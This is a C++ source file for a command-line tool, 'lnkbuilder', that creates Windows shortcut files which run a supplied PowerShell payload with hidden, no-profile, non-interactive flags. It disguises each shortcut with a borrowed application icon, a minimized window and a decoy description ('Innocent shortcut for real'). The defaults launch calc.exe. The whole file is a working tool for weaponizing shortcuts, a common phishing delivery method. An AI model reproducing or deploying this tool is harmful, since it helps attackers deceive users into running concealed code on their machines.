// CreateLink - Uses the Shell's IShellLink and IPersistFile interfaces 
//              to create and store a shortcut to the specified object. 
//
// Returns the result of calling the member functions of the interfaces. 
//
// Parameters:
// lpszPathObj  - Address of a buffer that contains the path of the object,
//                including the file name.
// lpszPathLink - Address of a buffer that contains the path where the 
//                Shell link is to be stored, including the file name.
// lpszDesc     - Address of a buffer that contains a description of the 
//                Shell link, stored in the Comment field of the link
//                properties.

// #include "stdafx.h"
#include "windows.h"
#include "winnls.h"
#include "shobjidl.h"
#include "objbase.h"
#include "objidl.h"
#include "shlguid.h"
#include "string"
#include "map"
#include "stdio.h"
#include "iostream"
#include "type_traits"

HRESULT CreateLink(LPSTR target, LPSTR args, LPSTR linkFile, LPSTR desc, LPSTR icon, int showmode) 
{ 
    printf("creating shortcut file...\n");
    HRESULT hres; 
    IShellLink* psl;   
    IPersistFile* ppf; 
    WCHAR wsz[MAX_PATH]; 
    CoInitialize(NULL);

    // Get the full path
    char iconPathC[MAX_PATH];
    DWORD length = GetFullPathName(icon, MAX_PATH, iconPathC, nullptr);

    if (length == 0) {
        std::cerr << "Error getting full path. Error code: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "Setting icon from file: " << iconPathC << "\n";
    size_t len = strlen(iconPathC) + 1; 
    LPSTR iconPath = new char[len]; 

    strcpy_s(iconPath, len, iconPathC);

    // Get a pointer to the IShellLink interface. It is assumed that CoInitialize
    // has already been called.
    hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl); 
    if (SUCCEEDED(hres)) 
    { 
        printf("successfully created instance...\n");

        // Set the path to the shortcut target and add the description. 
        psl->SetPath(target); 
        psl->SetArguments(args); 
        psl->SetDescription(desc); 
        psl->SetShowCmd(showmode); 
        // psl->SetWorkingDirectory(curdir);
        psl->SetIconLocation(iconPath, 0); 

        // Query IShellLink for the IPersistFile interface, used for saving the 
        // shortcut in persistent storage. 
        hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf); 

        if (SUCCEEDED(hres)) 
        { 
            printf("successfully query the interface...\n");

            // Ensure that the string is Unicode. 
            MultiByteToWideChar(CP_ACP, 0, linkFile, -1, wsz, MAX_PATH); 

            // Save the link by calling IPersistFile::Save.
            printf("saving file...");
            hres = ppf->Save(wsz, TRUE); 
            ppf->Release(); 
        } 
        psl->Release(); 
    } 
    delete[] iconPath;
    return hres; 
}

void printHelp(){
    char help[] = "Usage: lnkbuilder.exe [Options]\n"
                  "Options: \n\t--description / -d set description for lnk file.\n"
                  "\t--payload / -p payload to be executed, must be powershell script.\n"
                  "\t--file / -f get payload from ps1 file.\n"
                  "\t--icon / -i icon to be used.\n"
                  "\t--output / -o name of output files, should ends with .lnk\n"
                  "Example: lnkbuilder.exe --payload \"Start-Process notepad.exe\" -o notepad.lnk\n";
    printf(help);
}

std::string cleanArg(std::string str) {
    char characterToRemove = '-';
    // Iterate up to the minimum of the length of the string and 3
    for (size_t i = 0; i < std::min(str.length(), (size_t)3); i++) {
        if (str[i] == characterToRemove) {
            str.erase(i, 1); // Remove 1 character at position i
            i--; // Adjust the index to account for the erased character
        }
    }
    return str;
}

int main(int argc, char* argv[]){
    std::map<std::string, std::string> options;
    options["description"] = "Innocent shortcut for real";
    options["payload"] = "Start-Process calc.exe";
    options["output"] = "output.lnk";
    options["icon"] = "C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe";
    options["file"] = "/dev/null";
    if(argc < 2){
        printf("ERR: Please pass correct amount of parameters.\n");
        printHelp();
        return 0;
    }
    
    for (std::pair<std::string, std::string> element : options) {
        std::string key = element.first;
        std::string value = element.second;
        char x = key[0];
        std::string keyshort(1, x);
        for( int i = 1; i < argc; i++ ){
            std::string arg(argv[i]);
            // skip the overload if args doesnt start with - or --
            if (arg.rfind("-", 0) == 0) {
                arg = cleanArg(arg);
                if(key == arg){
                    if(argv[i+1] != NULL){
                        options[key] = argv[i + 1];
                    }
                }else if(keyshort == arg){
                    if(argv[i+1] != NULL){
                        options[key] = argv[i + 1];
                    }
                }
            }
        }
    }
    options["output"] = "./" + options["output"];
    options["payload"] = "-Nop -sta -noni -w hidden " + options["payload"];
    LPSTR res = const_cast<char *>(options["output"].c_str());
    LPSTR desc = const_cast<char *>(options["description"].c_str());
    LPSTR target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    LPSTR args = const_cast<char *>(options["payload"].c_str());
    LPSTR icon = const_cast<char *>(options["icon"].c_str());
    CreateLink(target, args, res, desc, icon, 7);
    return 0;
}
